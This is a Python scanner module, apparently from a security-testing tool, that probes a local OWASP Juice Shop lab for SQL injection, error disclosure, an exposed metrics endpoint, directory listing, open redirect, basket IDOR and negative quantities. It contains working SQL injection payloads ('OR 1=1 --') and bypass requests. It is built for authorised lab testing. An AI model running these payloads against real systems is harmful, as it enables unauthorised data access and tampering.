"""Evidence-based probes for the explicitly owned Juice Shop lab."""

import secrets
from urllib.parse import quote

from .catalog import RULES
from .net import LocalHTTP


def scan_juice(url, credentials=None):
    client = LocalHTTP(url)
    findings = []
    identity = client.request("GET", "/rest/admin/application-version")
    if (
        identity["status"] != 200
        or not isinstance(identity["body"], dict)
        or "version" not in identity["body"]
    ):
        raise ValueError("This adapter requires a verified local Juice Shop instance")

    def check(identifier, title, kind, source, run):
        start = len(client.evidence)
        try:
            control, positive, detail = run()
            state = (
                "confirmed"
                if control and positive
                else "not_reproduced"
                if control
                else "inconclusive"
            )
        except (OSError, ValueError, KeyError, TypeError, RuntimeError) as error:
            state, detail = "inconclusive", str(error)
        rule = RULES[kind]
        findings.append(
            dict(
                id=identifier,
                title=title,
                kind=kind,
                owasp=rule["owasp"],
                cwe=rule["cwe"],
                severity=rule["severity"],
                state=state,
                source=source,
                detail=detail,
                advice=rule["advice"],
                code=rule["code"],
                reference=rule["reference"],
                evidence=client.evidence[start:],
                evidence_ids=[e["id"] for e in client.evidence[start:]],
            )
        )

    def search():
        normal = client.request("GET", "/rest/products/search?q=Apple")
        empty = client.request("GET", "/rest/products/search?q=SECUREFLOW_NONEXISTENT_92731")
        count = 0
        for payload in [
            "SECUREFLOW_NONEXISTENT_92731')) OR 1=1 -- ",
            "SECUREFLOW_NONEXISTENT_92731')) OR TRUE -- ",
        ]:
            attack = client.request("GET", "/rest/products/search?q=" + quote(payload, safe=""))
            if attack["status"] == 200 and isinstance(attack["body"], dict):
                count = max(count, len(attack["body"].get("data", [])))
        control = (
            normal["status"] == 200
            and bool(normal["body"].get("data"))
            and empty["body"].get("data") == []
        )
        return (
            control,
            count > 0,
            f"없는 검색어의 SQL 조건 우회 후 상품 {count}개 반환. 사용자 테이블은 조회하지 않음.",
        )

    check("juice-search-sqli", "상품 검색 SQL 삽입 · 2개 변형", "sql", "routes/search.ts", search)

    def errors():
        normal = client.request("GET", "/rest/products/search?q=Apple")
        malformed = client.request("GET", "/rest/products/search?q=" + quote("'", safe=""))
        body = str(malformed["body"])
        return (
            normal["status"] == 200,
            malformed["status"] >= 500
            and any(s in body for s in ["SQLITE_ERROR", "Sequelize", "/juice-shop/"]),
            "정상 검색과 잘못된 따옴표 입력의 오류 응답 비교.",
        )

    check("juice-error", "내부 SQL·스택 오류 노출", "debug", "server.ts / routes/search.ts", errors)

    def metrics():
        response = client.request("GET", "/metrics")
        text = str(response["body"])
        return (
            response["status"] == 200,
            "# HELP" in text and any(s in text for s in ["process_", "http_requests", "nodejs_"]),
            "비인증 접근으로 프로세스/요청 계측 정보가 노출되는지 확인.",
        )

    check("juice-metrics", "비인증 내부 계측 정보 노출", "debug", "routes/metrics.ts", metrics)

    def directory():
        response = client.request("GET", "/ftp/")
        text = str(response["body"])
        return (
            response["status"] == 200,
            "acquisitions.md" in text or "package.json.bak" in text,
            "파일 목록만 조회하며 로그·키 파일은 다운로드하지 않음.",
        )

    check("juice-directory", "공개 디렉터리 목록", "debug", "server.ts", directory)

    def redirect():
        allowed = "https://github.com/juice-shop/juice-shop"
        normal = client.request("GET", "/redirect?to=" + quote(allowed, safe=""))
        rejected = client.request(
            "GET", "/redirect?to=" + quote("https://example.invalid/", safe="")
        )
        target = "https://example.invalid/?next=" + allowed
        attack = client.request("GET", "/redirect?to=" + quote(target, safe=""))
        location = {k.lower(): v for k, v in attack["headers"].items()}.get("location", "")
        return (
            300 <= normal["status"] < 400 and rejected["status"] >= 400,
            300 <= attack["status"] < 400 and location.startswith("https://example.invalid/"),
            "Location 헤더만 확인. 외부 URL로 이동하지 않음.",
        )

    check(
        "juice-redirect",
        "리다이렉트 허용 목록 부분문자열 우회",
        "access",
        "lib/insecurity.ts / routes/redirect.ts",
        redirect,
    )

    # Use supplied account or create two isolated synthetic accounts; secrets never enter artifacts.
    def account():
        email = "secureflow-" + secrets.token_hex(6) + "@example.invalid"
        password = secrets.token_urlsafe(24)
        created = client.request(
            "POST", "/api/Users", {"email": email, "password": password, "passwordRepeat": password}
        )
        if created["status"] not in (200, 201):
            raise ValueError("Synthetic account creation failed")
        login = client.request("POST", "/rest/user/login", {"email": email, "password": password})
        if login["status"] != 200:
            raise ValueError("Synthetic login failed")
        return login["body"]["authentication"]

    try:
        if credentials and credentials.get("username"):
            login = client.request(
                "POST",
                "/rest/user/login",
                {"email": credentials["username"], "password": credentials["password"]},
            )
            if login["status"] != 200:
                raise ValueError("Connected target account login failed")
            actor = login["body"]["authentication"]
        else:
            actor = account()
        peer = account()

        def access():
            own = client.request("GET", f"/rest/basket/{actor['bid']}", token=actor["token"])
            peer_own = client.request("GET", f"/rest/basket/{peer['bid']}", token=peer["token"])
            foreign = client.request("GET", f"/rest/basket/{peer['bid']}", token=actor["token"])
            control = own["status"] == peer_own["status"] == 200 and actor["bid"] != peer["bid"]
            found = (
                foreign["status"] == 200
                and foreign["body"].get("data", {}).get("id") == peer["bid"]
            )
            return control, found, "두 개의 자체 실습 계정으로 객체 소유권을 대조."

        check(
            "juice-basket-idor",
            "다른 테스트 계정 장바구니 조회",
            "access",
            "routes/basket.ts",
            access,
        )

        def quantity():
            normal = client.request(
                "POST",
                "/api/BasketItems",
                {"ProductId": 1, "BasketId": actor["bid"], "quantity": 1},
                actor["token"],
            )
            successes = []
            for value, product in [(-1, 2), (-2, 3)]:
                attack = client.request(
                    "POST",
                    "/api/BasketItems",
                    {"ProductId": product, "BasketId": actor["bid"], "quantity": value},
                    actor["token"],
                )
                successes.append(
                    attack["status"] in (200, 201)
                    and attack["body"].get("data", {}).get("quantity") == value
                )
            return (
                normal["status"] in (200, 201),
                any(successes),
                "자체 계정 장바구니만 변경. 주문·결제는 수행하지 않음.",
            )

        check(
            "juice-quantity",
            "음수 장바구니 수량 · 2개 변형",
            "negative_quantity",
            "routes/basketItems.ts",
            quantity,
        )
    except (ValueError, KeyError, OSError, TypeError) as error:
        failure_reason = str(error)
        for identifier, title, kind, source in [
            ("juice-basket-idor", "장바구니 소유권", "access", "routes/basket.ts"),
            ("juice-quantity", "음수 수량", "negative_quantity", "routes/basketItems.ts"),
        ]:

            def failed():
                return False, False, failure_reason

            check(identifier, title, kind, source, failed)
    return dict(
        findings=findings,
        evidence=client.evidence,
        request_count=client.count,
        version=identity["body"],
        coverage_note="Juice Shop 어댑터가 검증한 범위만 표시. Top 10 전체 검증은 별도 40개 실습 사례에서 수행.",
    )
